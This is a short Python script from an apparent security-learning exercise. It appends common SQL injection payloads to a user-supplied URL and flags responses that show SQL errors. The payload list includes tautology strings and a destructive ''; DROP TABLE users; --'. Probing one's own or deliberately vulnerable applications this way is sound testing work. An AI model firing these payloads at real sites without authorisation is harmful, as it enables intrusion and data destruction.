# Day 28-30: SQL Injection Simulation
# Build a simple script to test SQL injection vulnerabilities in a vulnerable web application (e.g., by
# injecting common payloads).

import requests

# Common SQL injection payloads
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1--",
    "' OR 'a'='a",
    "\" OR \"\"=\"",
    "'; DROP TABLE users; --",
]

def scan_sql_injection(url):
    print(f"Scanning {url} for SQL injection vulnerabilities...\n")

    for payload in payloads:
        # Inject the payload into the URL
        test_url = url + payload
        try:
            response = requests.get(test_url)
            if "sql" in response.text.lower() or "syntax" in response.text.lower() or response.status_code == 500:
                print(f"🚨 Potential SQL Injection Found with payload: {payload}")
            else:
                print(f"❌ Payload {payload} did not trigger any errors.")
        except Exception as e:
            print(f"Request failed with payload {payload}: {e}")

# EXAMPLE USAGE
if __name__ == "__main__":
    # Example vulnerable URL: "http://testphp.vulnweb.com/artists.php?artist="
    target = input("Enter target URL (e.g., http://example.com/page.php?id=): ")
    scan_sql_injection(target)
